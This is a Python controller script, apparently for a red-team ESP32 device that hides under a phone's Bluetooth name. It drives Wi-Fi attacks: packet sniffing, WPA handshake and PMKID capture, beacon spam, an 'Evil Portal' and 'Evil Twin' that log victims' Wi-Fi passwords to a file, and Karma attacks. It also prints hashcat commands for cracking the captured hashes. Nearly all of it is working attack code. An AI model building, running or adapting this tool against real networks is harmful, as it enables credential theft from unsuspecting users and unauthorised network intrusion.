#!/usr/bin/env python3
"""
Red Team BLE Controller for ESP32
"""
import asyncio
import json
import sys
import base64
import os
import struct
from datetime import datetime
from bleak import BleakClient, BleakScanner

SERVICE_UUID = "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
CMD_UUID     = "beb5483e-36e1-4688-b7f5-ea07361b26a8"
RSP_UUID     = "beb5483e-36e1-4688-b7f5-ea07361b26a9"
DEVICE_NAME  = "Galaxy S23 Prime+"
CAPTURE_DIR  = os.path.expanduser("~/Projet-TC/ESP-32/captures")

# ============================================================
#  Globals
# ============================================================
response_buffer = ""
response_event  = asyncio.Event()
last_response   = {}

# Sniffer report
report_stats   = {}
report_aps     = []
report_clients = []
report_probes  = []
report_events  = []
report_done    = False

# Handshake
frame_meta    = {}
frame_chunks  = {}
frame_done    = {}
capture_bssid   = ""
capture_channel = 0

# Portal
portal_creds = []
portal_running = False

# Karma
karma_running = False
karma_probes  = []

# ============================================================
#  Notification handler
# ============================================================
def notification_handler(sender, data):
    global response_buffer, last_response
    chunk = data.decode("utf-8", errors="ignore")
    response_buffer += chunk

    braces = 0; in_str = False; complete = False
    for i, c in enumerate(response_buffer):
        if c == '"' and (i == 0 or response_buffer[i-1] != '\\'):
            in_str = not in_str
        if not in_str:
            if c == '{': braces += 1
            if c == '}':
                braces -= 1
                if braces == 0: complete = True; break

    if complete:
        try:
            obj = json.loads(response_buffer)
            response_buffer = ""
            dispatch(obj)
            response_event.set()
        except Exception:
            response_buffer = ""

# ============================================================
#  Dispatcher
# ============================================================
def dispatch(data):
    global last_response
    global report_stats, report_aps, report_clients
    global report_probes, report_events, report_done
    global frame_meta, frame_chunks, frame_done
    global portal_creds, portal_running
    global karma_probes

    status  = data.get("status", "")
    section = data.get("section", "")

    # ── Sniffer rapport ───────────────────────────────────
    if status == "report":
        if section == "stats":
            report_stats = data
            print(f"\033[96m[STATS] "
                  f"total={data.get('total',0)} "
                  f"aps={data.get('aps',0)} "
                  f"clients={data.get('clients',0)} "
                  f"probes={data.get('probes',0)}\033[0m")

        elif section == "ap":
            report_aps.append(data)
            print(f"\033[92m[AP] "
                  f"{data.get('ssid','?'):<20} "
                  f"{data.get('bssid','?')} "
                  f"ch={data.get('channel',0)} "
                  f"rssi={data.get('rssi',-100)}dBm\033[0m")

        elif section == "client":
            report_clients.append(data)
            print(f"\033[93m[CLIENT] "
                  f"{data.get('mac','?')} → "
                  f"{data.get('ap','?')} "
                  f"pkts={data.get('pkts',0)}\033[0m")

        elif section == "probe":
            report_probes.append(data)
            print(f"\033[95m[PROBE] "
                  f"{data.get('mac','?')} "
                  f"cherche '{data.get('ssid','?')}' "
                  f"x{data.get('count',0)}\033[0m")

        elif section == "event":
            report_events.append(data)
            print(f"\033[94m[EVENT] "
                  f"{data.get('type','?')} "
                  f"{data.get('bssid','?')}\033[0m")

        last_response = data
        return

    elif status == "report_complete":
        report_done = True
        save_sniffer_report()
        last_response = data
        return

    # ── Handshake frames ──────────────────────────────────
    elif status == "capture_frame":
        idx = data["index"]
        frame_meta[idx] = data
        print(f"\033[96m[FRAME {idx+1}/{data['total']}] "
              f"{data.get('type_name','?')} "
              f"— {data.get('len',0)}b\033[0m")
        last_response = data
        return

    elif status == "frame_data":
        idx   = data["index"]
        chunk = data["chunk"]
        # FIX 3 — supporter "total" et "chunks"
        total = data.get("total", data.get("chunks", 1))
        if idx not in frame_chunks:
            frame_chunks[idx] = {}
        frame_chunks[idx][chunk] = data["data"]
        if len(frame_chunks[idx]) == total:
            b64 = "".join(
                frame_chunks[idx][c] for c in range(total))
            try:
                raw = base64.b64decode(b64)
                frame_done[idx] = raw
            except Exception as e:
                print(f"\033[91m[!] Decode error: {e}\033[0m")
        last_response = data
        return

    elif status == "transfer_complete":
        save_full_capture(data)
        last_response = data
        return

    # ── EAPOL progress ────────────────────────────────────
    elif status == "eapol":
        frame = data.get("frame", "?")
        print(f"\033[95m[EAPOL] M{frame}/4 capturé\033[0m")
        last_response = data
        return

    elif status == "handshake_captured":
        print(f"\033[92m[+] HANDSHAKE COMPLET! "
              f"{data.get('eapol_frames',0)}/4 EAPOL\033[0m")
        last_response = data
        return

    elif status == "handshake_ready":
        eapol = data.get('eapol_frames', 0)
        frames = data.get('total_frames', 0)
        bssid = data.get('bssid', '?')
        print(f"\n\033[92m{'='*55}")
        print(f"  HANDSHAKE CAPTURE!")
        print(f"  EAPOL  : {eapol}/4")
        print(f"  Frames : {frames}")
        print(f"  BSSID  : {bssid}")
        print(f"  Appuyez ENTER pour sauvegarder")
        print(f"{'='*55}\033[0m\n")
        last_response = data
        return

    elif status == "handshake_timeout":
        eapol = data.get('eapol_frames', 0)
        print(f"\033[91m[!] Timeout — {eapol}/4 EAPOL captures\033[0m")
        last_response = data
        return

    # ── Portal credentials ────────────────────────────────
    elif status == "portal_cred":
        cred = {
            "client_ip": data.get("client_ip", data.get("url", "?")),
            "ssid"     : data.get("ssid", data.get("username", "?")),
            "password" : data.get("password", ""),
            "ts"       : datetime.now().isoformat()
        }
        portal_creds.append(cred)
        print(f"\n\033[91m{'!'*55}")
        print(f"  PASSWORD CAPTURED!")
        print(f"  SSID       : {cred['ssid']}")
        print(f"  Password   : {cred['password']}")
        print(f"  Client IP  : {cred['client_ip']}")
        print(f"  Time       : {cred['ts']}")
        print(f"{'!'*55}\033[0m\n")
        save_portal_cred(cred)
        last_response = data
        return


    elif status == "portal_stopped":
        portal_running = False
        print(f"\033[93m[+] Portal arrêté — "
              f"{data.get('creds_captured',0)} creds\033[0m")
        last_response = data
        return

    # ── Karma probes ──────────────────────────────────────
    elif status == "karma_probe":
        p = {
            "mac" : data.get("mac","?"),
            "ssid": data.get("ssid","?"),
            "rssi": data.get("rssi",0)
        }
        karma_probes.append(p)
        print(f"\033[95m[KARMA] "
              f"{p['mac']} cherche "
              f"'{p['ssid']}' "
              f"rssi={p['rssi']}dBm\033[0m")
        last_response = data
        return

    elif status == "hop_stats":
        print(f"\033[96m[HOP] ch={data.get('channel',0)} "
              f"aps={data.get('aps',0)} "
              f"clients={data.get('clients',0)} "
              f"probes={data.get('probes',0)}\033[0m")
        last_response = data
        return

    elif status == "pmkid_found":
        print(f"\n\033[92m{'='*55}")
        print(f"  PMKID CAPTURE!")
        print(f"  SSID   : {data.get('ssid','?')}")
        print(f"  BSSID  : {data.get('bssid','?')}")
        print(f"  Client : {data.get('client','?')}")
        print(f"  PMKID  : {data.get('pmkid','?')}")
        print(f"  Hash   : {data.get('hash','?')}")
        print(f"{'='*55}\033[0m")
        # Sauvegarder
        save_pmkid(data)
        last_response = data
        return

    elif status == "pmkid_complete":
        found = data.get('found',0)
        print(f"\033[92m[+] PMKID terminé: {found} trouvés\033[0m")
        last_response = data
        return

    elif status == "pmkid_progress":
        found   = data.get('found',0)
        elapsed = data.get('elapsed_s',0)
        print(f"\033[96m[PMKID] {found} trouvés "
              f"({elapsed}s)\033[0m")
        last_response = data
        return

    elif status == "twin_cred":
        print(f"\n\033[91m{'!'*55}")
        print(f"  EVIL TWIN — PASSWORD CAPTURED!")
        print(f"  SSID       : {data.get('ssid','?')}")
        print(f"  Password   : {data.get('password','?')}")
        print(f"  Client IP  : {data.get('client_ip','?')}")
        print(f"{'!'*55}\033[0m\n")
        save_portal_cred({
            "ssid"     : data.get("ssid","?"),
            "password" : data.get("password",""),
            "client_ip": data.get("client_ip","?"),
            "ts"       : datetime.now().isoformat()
        })
        last_response = data
        return

    elif status == "twin_stopped":
        print(f"\033[93m[+] Evil Twin arrete — "
              f"{data.get('creds_captured',0)} creds\033[0m")
        last_response = data
        return

    # ── Auth ──────────────────────────────────────────────
    elif status == "auth_required":
        print(f"\033[93m[*] Auth required\033[0m")
        last_response = data
        return

    elif status == "auth_ok":
        print(f"\033[92m[+] Authenticated!\033[0m")
        last_response = data
        return

    elif status == "auth_failed":
        atl = data.get("attempts_left", 0)
        print(f"\033[91m[!] Auth failed "
              f"({atl} attempts left)\033[0m")
        last_response = data
        return

    elif status == "error":
        print(f"\033[91m[!] Error: "
              f"{data.get('message','')}\033[0m")
        last_response = data
        return

    elif status == "stats":
        cmd = data.get("cmd","")
        if cmd == "sniffer":
            print(f"\033[96m[SNIF] "
                  f"total={data.get('total',0)} "
                  f"aps={data.get('aps',0)} "
                  f"clients={data.get('clients',0)} "
                  f"probes={data.get('probes',0)} "
                  f"t={data.get('uptime_s',0)}s\033[0m")
        last_response = data
        return

    # ── Autres ────────────────────────────────────────────
    last_response = data
    msg = data.get("message","")
    if msg:
        print(f"\033[92m[+] {msg}\033[0m")
    else:
        print(f"\033[97m{json.dumps(data, indent=2)}\033[0m")

# ============================================================
#  Sauvegarde sniffer
# ============================================================
def save_sniffer_report():
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"{CAPTURE_DIR}/sniff_{ts}.json"
    report = {
        "timestamp": ts,
        "stats"    : report_stats,
        "aps"      : report_aps,
        "clients"  : report_clients,
        "probes"   : report_probes,
        "events"   : report_events
    }
    with open(path, "w") as f:
        json.dump(report, f, indent=2)

    print(f"\n\033[92m{'='*50}")
    print(f"  RAPPORT SNIFFER")
    print(f"{'='*50}")
    print(f"  Fichier : {path}")
    print(f"  APs     : {len(report_aps)}")
    print(f"  Clients : {len(report_clients)}")
    print(f"  Probes  : {len(report_probes)}")
    if report_aps:
        print(f"\n  APs détectés :")
        for ap in report_aps:
            print(f"    {ap.get('ssid','?'):<20} "
                  f"{ap.get('bssid','?')} "
                  f"ch={ap.get('channel',0)}")
    if report_clients:
        print(f"\n  Clients connectés :")
        for c in report_clients:
            print(f"    {c.get('mac','?')} → "
                  f"{c.get('ap','?')}")
    if report_probes:
        print(f"\n  Probes :")
        for p in report_probes:
            print(f"    {p.get('mac','?')} cherche "
                  f"'{p.get('ssid','?')}'")
    print(f"{'='*50}\033[0m\n")

# ============================================================
#  Sauvegarde handshake PCAP
# ============================================================
def save_full_capture(meta):
    global frame_done, frame_meta
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    bssid_s = capture_bssid.replace(":", "")
    base    = f"{CAPTURE_DIR}/capture_{bssid_s}_{ts}"

    radiotap  = struct.pack("<BBHI", 0, 0, 8, 0)
    pcap_path = base + ".pcap"

    with open(pcap_path, "wb") as f:
        f.write(struct.pack("<IHHiIII",
            0xA1B2C3D4, 2, 4, 0, 0, 65535, 127))
        for idx in sorted(frame_done.keys()):
            raw  = frame_done[idx]
            m    = frame_meta.get(idx, {})
            ts_ms= m.get("ts_ms", idx * 100)
            full = radiotap + raw
            f.write(struct.pack("<IIII",
                ts_ms // 1000,
                (ts_ms % 1000) * 1000,
                len(full), len(full)))
            f.write(full)

    json_path = base + ".json"
    jdata = {
        "bssid"  : capture_bssid,
        "channel": capture_channel,
        "frames" : {}
    }
    for idx in sorted(frame_done.keys()):
        raw = frame_done[idx]
        m   = frame_meta.get(idx, {})
        jdata["frames"][str(idx)] = {
            "type": m.get("type_name","?"),
            "len" : len(raw),
            "hex" : raw.hex(),
            "b64" : base64.b64encode(raw).decode()
        }
    with open(json_path, "w") as f:
        json.dump(jdata, f, indent=2)

    print(f"\n\033[92m{'='*50}")
    print(f"  HANDSHAKE SAUVEGARDÉ")
    print(f"{'='*50}")
    print(f"  BSSID  : {capture_bssid}")
    print(f"  Frames : {len(frame_done)}")
    print(f"  PCAP   : {pcap_path}")
    print(f"  JSON   : {json_path}")
    print(f"{'='*50}\033[0m")
    print(f"\033[93m  hcxpcapngtool {pcap_path} "
          f"-o {base}.hc22000\033[0m\n")

# ============================================================
#  Sauvegarde portal creds
# ============================================================
def save_pmkid(data):
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"{CAPTURE_DIR}/pmkid_{ts}.txt"
    h    = data.get("hash","")
    ssid = data.get("ssid","?")
    with open(path, "w") as f:
        f.write(h + "\n")
    print(f"\033[92m[+] PMKID sauvegardé: {path}\033[0m")
    print(f"\033[93m    hashcat -m 22000 {path} wordlist.txt\033[0m")

def save_portal_cred(cred):
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    path = f"{CAPTURE_DIR}/portal_creds.txt"
    with open(path, "a") as f:
        f.write(f"[{cred.get('ts','')}] "
                f"SSID={cred.get('ssid','')} | "
                f"Pass={cred.get('password','')} | "
                f"IP={cred.get('client_ip','')}\n")

# ============================================================
#  Send / Wait
# ============================================================
async def send_cmd(client, payload):
    global response_event
    response_event.clear()
    await client.write_gatt_char(
        CMD_UUID,
        json.dumps(payload).encode(),
        response=True)

async def wait_response(timeout=30):
    try:
        await asyncio.wait_for(
            response_event.wait(), timeout=timeout)
        return last_response
    except asyncio.TimeoutError:
        print("\033[91m[TIMEOUT]\033[0m")
        return {}

async def wait_enter():
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, sys.stdin.readline)

# ============================================================
#  Sniffer — FIX 2 envoie sniffer_report après stop
# ============================================================
async def run_sniffer(client, channel, bssid=None):
    global report_stats, report_aps, report_clients
    global report_probes, report_events, report_done

    report_stats = {}; report_aps = []
    report_clients = []; report_probes = []
    report_events = []; report_done = False

    cmd = {"cmd": "sniffer", "channel": channel}
    if bssid:
        cmd["bssid"] = bssid

    await send_cmd(client, cmd)
    await wait_response(timeout=10)

    print(f"\033[93m[*] ENTER pour stopper...\033[0m")
    try:
        await wait_enter()
    except Exception:
        pass

    # Stop sniffer
    await send_cmd(client, {"cmd": "stop"})
    await wait_response(timeout=5)

    # FIX 2 — demander le rapport
    print(f"\033[96m[*] Récupération du rapport...\033[0m")
    await send_cmd(client, {"cmd": "sniffer_report"})

    # Attendre report_complete
    start = asyncio.get_event_loop().time()
    while not report_done:
        if asyncio.get_event_loop().time() - start > 60:
            print("\033[91m[TIMEOUT] rapport\033[0m")
            break
        response_event.clear()
        try:
            await asyncio.wait_for(
                response_event.wait(), timeout=10)
        except asyncio.TimeoutError:
            break

# ============================================================
#  Handshake — FIX 1 envoie handshake_send pour récupérer
# ============================================================
async def handshake_capture(client, bssid, channel):
    global frame_meta, frame_chunks, frame_done
    global capture_bssid, capture_channel

    capture_bssid   = bssid
    capture_channel = channel
    frame_meta      = {}
    frame_chunks    = {}
    frame_done      = {}

    print(f"\033[96m[*] Target  : {bssid}\033[0m")
    print(f"\033[96m[*] Channel : {channel}\033[0m")
    print(f"\033[93m[*] Deconnectez/reconnectez "
          f"un appareil au réseau...\033[0m")
    print(f"\033[93m[*] ENTER pour arrêter manuellement\033[0m\n")

    await send_cmd(client, {
        "cmd"    : "handshake",
        "bssid"  : bssid,
        "channel": channel
    })
    await wait_response(timeout=10)

    # Attendre ENTER ou 4 EAPOL
    eapol_done = asyncio.Event()

    async def watch_eapol():
        start = asyncio.get_event_loop().time()
        while asyncio.get_event_loop().time() - start < 120:
            response_event.clear()
            try:
                await asyncio.wait_for(
                    response_event.wait(), timeout=2)
            except asyncio.TimeoutError:
                pass
            rsp = last_response
            st  = rsp.get("status", "")
            if st in ("handshake_ready",
                      "handshake_captured",
                      "handshake_timeout"):
                eapol_done.set()
                break
            if st == "eapol" and rsp.get("frame", 0) >= 4:
                eapol_done.set()
                break
                break

    watch_task = asyncio.ensure_future(watch_eapol())

    # Attendre ENTER ou eapol_done
    enter_task = asyncio.ensure_future(wait_enter())
    done, _ = await asyncio.wait(
        [watch_task, enter_task],
        return_when=asyncio.FIRST_COMPLETED
    )

    watch_task.cancel()
    enter_task.cancel()

    # FIX 1 — envoyer handshake_send pour récupérer les frames
    print(f"\033[96m[*] Récupération des frames...\033[0m")
    await send_cmd(client, {"cmd": "handshake_send"})

    # Attendre transfer_complete
    start = asyncio.get_event_loop().time()
    while True:
        remaining = 120 - (asyncio.get_event_loop().time() - start)
        if remaining <= 0:
            print("\033[91m[TIMEOUT] transfer\033[0m")
            break
        response_event.clear()
        try:
            await asyncio.wait_for(
                response_event.wait(), timeout=remaining)
        except asyncio.TimeoutError:
            print("\033[91m[TIMEOUT]\033[0m")
            break
        rsp = last_response
        if rsp.get("status") == "transfer_complete":
            break
        if rsp.get("status") == "handshake_captured":
            print(f"\033[92m[+] Handshake complet!\033[0m")

# ============================================================
#  Portal — attente creds en temps réel
# ============================================================
async def run_portal(client, ssid, channel, password=None):
    global portal_creds, portal_running
    portal_creds   = []
    portal_running = True

    cmd = {"cmd": "portal", "ssid": ssid, "channel": channel}
    if password:
        cmd["password"] = password

    await send_cmd(client, cmd)
    await wait_response(timeout=10)

    print(f"\033[93m[*] Portal actif sur '{ssid}' ch={channel}")
    print(f"[*] ENTER pour arrêter...\033[0m")

    # Attendre ENTER — les creds arrivent via dispatch()
    try:
        await wait_enter()
    except Exception:
        pass

    # Arrêter le portal
    await send_cmd(client, {"cmd": "stop"})
    await wait_response(timeout=5)

    print(f"\033[92m[+] Total creds capturés : "
          f"{len(portal_creds)}\033[0m")
    for c in portal_creds:
        print(f"  {c.get('ssid','?')} / {c.get('password','?')}")

# ============================================================
#  Karma — affichage temps réel
# ============================================================
async def run_karma(client, channel):
    global karma_probes
    karma_probes = []

    await send_cmd(client, {"cmd": "karma", "channel": channel})
    await wait_response(timeout=10)

    print(f"\033[93m[*] Karma actif ch={channel}")
    print(f"[*] ENTER pour arrêter...\033[0m")

    try:
        await wait_enter()
    except Exception:
        pass

    await send_cmd(client, {"cmd": "stop"})
    await wait_response(timeout=5)

    print(f"\033[92m[+] SSIDs interceptés : "
          f"{len(karma_probes)}\033[0m")
    for p in karma_probes:
        print(f"  {p['mac']} cherche '{p['ssid']}'")

# ============================================================
#  Menu
# ============================================================
def print_menu():
    print("""
\033[96m+==========================================+
|       RED ESP32 - BLE Console            |
+==========================================+
|  RECON                                   |
|   1.  WiFi Scan                          |
|   2.  Sniffer (canal)                    |
|   3.  Sniffer filtre BSSID               |
|   4.  Sniffer Channel Hopping (1-13)     |
|   5.  Handshake Capture -> PCAP          |
|   6.  PMKID Capture                      |
+------------------------------------------+
|  OFFENSIF                                |
|   7.  Beacon Spam - Liste SSIDs          |
|   8.  Beacon Spam - Aleatoire            |
|   9.  Evil Portal                        |
|   10. Evil Twin (Rogue AP)               |
|   11. Karma Attack                       |
+------------------------------------------+
|   12. Status ESP32                       |
|   13. Stop attaque                       |
|   0.  Quitter                            |
+==========================================+\033[0m
""")

# ============================================================
#  Interactive session
# ============================================================
async def interactive(client):
    print(f"\033[96m[*] Service discovery...\033[0m")
    await asyncio.sleep(2)

    # Vérifier service
    found = any(s.uuid.lower() == SERVICE_UUID.lower()
                for s in client.services)
    if not found:
        print(f"\033[91m[!] Service BLE non trouvé\033[0m")
        return

    await client.start_notify(RSP_UUID, notification_handler)
    print(f"\033[92m[+] Notifications activées\033[0m")

    # Auth
    rsp = await wait_response(timeout=15)
    if rsp.get("status") != "auth_required":
        await send_cmd(client, {"ping": "1"})
        rsp = await wait_response(timeout=10)

    pin = input("\033[93m[AUTH] PIN: \033[0m").strip()
    await send_cmd(client, {"pin": pin})
    rsp = await wait_response(timeout=10)
    if rsp.get("status") != "auth_ok":
        print(f"\033[91m[!] Auth échouée\033[0m")
        return

    print(f"\033[92m[+] Authentifié!\033[0m")
    print(f"\033[96m[*] Captures: {CAPTURE_DIR}\033[0m")

    while True:
        print_menu()
        try:
            choice = input("\033[97mChoice > \033[0m").strip()
        except (KeyboardInterrupt, EOFError):
            break

        try:
            # ── 1. Scan ──────────────────────────────────
            if choice == "1":
                print(f"\033[96m[*] Scanning...\033[0m")
                await send_cmd(client, {"cmd": "scan"})
                await wait_response(timeout=30)

            # ── 2. Sniffer canal ─────────────────────────
            elif choice == "2":
                ch = input("  Channel (1) > ").strip()
                ch = int(ch) if ch else 1
                await run_sniffer(client, ch)

            # ── 3. Sniffer filtré ────────────────────────
            elif choice == "3":
                bssid = input("  BSSID > ").strip()
                ch    = input("  Channel > ").strip()
                ch    = int(ch) if ch else 1
                await run_sniffer(client, ch, bssid)

            # ── 4. Hop Sniffer ───────────────────────────
            elif choice == "4":
                print(f"\033[96m[*] Channel hopping sniffer...\033[0m")
                await send_cmd(client, {"cmd": "hop_sniffer"})
                await wait_response(timeout=10)
                print(f"\033[93m[*] ENTER pour stopper...\033[0m")
                try:
                    await wait_enter()
                except:
                    pass
                await send_cmd(client, {"cmd": "stop"})
                await wait_response(timeout=5)
                print(f"\033[96m[*] Récupération rapport...\033[0m")
                await send_cmd(client, {"cmd": "sniffer_report"})
                start = asyncio.get_event_loop().time()
                while not report_done:
                    if asyncio.get_event_loop().time()-start > 60:
                        break
                    response_event.clear()
                    try:
                        await asyncio.wait_for(
                            response_event.wait(), timeout=10)
                    except asyncio.TimeoutError:
                        break

            # ── 5. Handshake ─────────────────────────────
            elif choice == "5":
                bssid = input("  BSSID > ").strip()
                ch    = input("  Channel > ").strip()
                ch    = int(ch) if ch else 1
                await handshake_capture(client, bssid, ch)

            # ── 6. PMKID ─────────────────────────────────
            elif choice == "6":
                bssid = input("  BSSID (vide=tous) > ").strip()
                ch    = input("  Channel (1) > ").strip()
                ch    = int(ch) if ch else 1
                cmd   = {"cmd": "pmkid", "channel": ch}
                if bssid:
                    cmd["bssid"] = bssid
                print(f"\033[96m[*] PMKID capture...\033[0m")
                await send_cmd(client, cmd)
                await wait_response(timeout=10)
                print(f"\033[93m[*] ENTER pour stopper...\033[0m")
                try:
                    await wait_enter()
                except:
                    pass
                await send_cmd(client, {"cmd": "pmkid_stop"})
                await wait_response(timeout=15)

            # ── 7. Beacon liste ──────────────────────────
            elif choice == "7":
                print("  SSIDs (ligne vide pour finir):")
                ssids = []
                while True:
                    s = input("  > ").strip()
                    if not s: break
                    ssids.append(s)
                if not ssids:
                    print("\033[91m[!] Aucun SSID\033[0m")
                    continue
                ch = input("  Channel (1) > ").strip()
                ch = int(ch) if ch else 1
                await send_cmd(client, {
                    "cmd"    : "beacon",
                    "ssids"  : ssids,
                    "channel": ch
                })
                await wait_response(timeout=5)
                print(f"\033[93m[*] Beacon actif — 13 pour stopper\033[0m")

            # ── 8. Beacon random ─────────────────────────
            elif choice == "8":
                n  = input("  Nombre SSIDs (20) > ").strip()
                n  = int(n) if n else 20
                ch = input("  Channel (1) > ").strip()
                ch = int(ch) if ch else 1
                await send_cmd(client, {
                    "cmd"    : "beacon",
                    "mode"   : "random",
                    "count"  : n,
                    "channel": ch
                })
                await wait_response(timeout=5)
                print(f"\033[93m[*] Beacon random — 13 pour stopper\033[0m")

            # ── 9. Evil Portal ───────────────────────────
            elif choice == "9":
                ssid = input("  SSID (Free_WiFi) > ").strip()
                ssid = ssid or "Free_WiFi"
                pw   = input("  Password (vide=open) > ").strip()
                ch   = input("  Channel (6) > ").strip()
                ch   = int(ch) if ch else 6
                await run_portal(client, ssid, ch,
                                 pw if pw else None)

            # ── 10. Evil Twin ────────────────────────────
            elif choice == "10":
                print(f"\033[93m[*] Lance d abord un scan (1)\033[0m")
                print(f"\033[93m    pour avoir le BSSID exact\033[0m")
                ssid  = input("  SSID cible > ").strip()
                bssid = input("  BSSID cible > ").strip()
                ch    = input("  Channel > ").strip()
                ch    = int(ch) if ch else 6
                pw    = input("  Password (vide=open) > ").strip()
                cmd   = {
                    "cmd"    : "evil_twin",
                    "ssid"   : ssid,
                    "channel": ch
                }
                if bssid: cmd["bssid"] = bssid
                if pw:    cmd["password"] = pw
                await send_cmd(client, cmd)
                await wait_response(timeout=10)
                print(f"\033[93m[*] Evil Twin actif — ENTER pour stopper\033[0m")
                try:
                    await wait_enter()
                except:
                    pass
                await send_cmd(client, {"cmd": "stop"})
                await wait_response(timeout=5)

            # ── 11. Karma ────────────────────────────────
            elif choice == "11":
                ch = input("  Channel (1) > ").strip()
                ch = int(ch) if ch else 1
                await run_karma(client, ch)

            # ── 12. Status ───────────────────────────────
            elif choice == "12":
                await send_cmd(client, {"cmd": "status"})
                await wait_response(timeout=5)

            # ── 13. Stop ─────────────────────────────────
            elif choice == "13":
                await send_cmd(client, {"cmd": "stop"})
                await wait_response(timeout=5)

            # ── 0. Quitter ───────────────────────────────
            elif choice == "0":
                print(f"\033[93m[*] Déconnexion...\033[0m")
                break

            else:
                print("\033[91m[!] Choix invalide\033[0m")

        except (KeyboardInterrupt, EOFError):
            try:
                await send_cmd(client, {"cmd": "stop"})
                await wait_response(timeout=5)
            except Exception:
                pass

# ============================================================
#  Main
# ============================================================
async def main():
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    print(f"\033[96m[*] Scanning '{DEVICE_NAME}'...\033[0m")

    device = await BleakScanner.find_device_by_name(
        DEVICE_NAME, timeout=15.0)

    if device is None:
        print(f"\033[91m[!] '{DEVICE_NAME}' non trouvé\033[0m")
        print(f"\033[93m[*] Appareils BLE disponibles:\033[0m")
        for d in await BleakScanner.discover(timeout=5.0):
            print(f"    {d.address} — {d.name}")
        sys.exit(1)

    print(f"\033[92m[+] Trouvé: {device.address}\033[0m")
    print(f"\033[96m[*] Connexion...\033[0m")

    try:
        async with BleakClient(device, timeout=20.0) as client:
            print(f"\033[92m[+] Connecté!\033[0m")
            await asyncio.sleep(1)
            await interactive(client)
    except Exception as e:
        print(f"\033[91m[!] Erreur: {e}\033[0m")

    print(f"\033[92m[+] Terminé\033[0m")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\033[93m[*] Bye\033[0m")
